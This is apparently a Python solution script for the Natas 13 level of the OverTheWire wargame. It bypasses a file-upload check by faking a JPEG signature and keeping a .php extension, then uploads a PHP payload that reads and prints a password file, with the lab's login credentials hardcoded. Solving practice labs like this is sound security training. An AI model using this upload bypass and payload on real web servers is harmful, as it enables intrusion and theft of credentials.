#!/usr/bin/env python3
#
# Solve Natas 13 -> 14.
#
import requests

url = 'http://natas13.natas.labs.overthewire.org/index.php'
auth = ('natas13', 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY')
# The extension from the stupid.php filename attribute
# will not be checked! If we modify the auto-generated
# form field it will pass through!
data = {'MAX_FILE_SIZE': 1000, 'filename': 'stupid.php'}

fake_sig = b'\xFF\xD8\xFF\xE0'
payload = fake_sig + b'''\
<?php
$file = file_get_contents('/etc/natas_webpass/natas14');
echo $file
?>'''

files = {'uploadedfile': ('something.php', payload, 'image/jpeg')}

resp = requests.post(url, auth=auth, data=data, files=files)
print(resp.text)
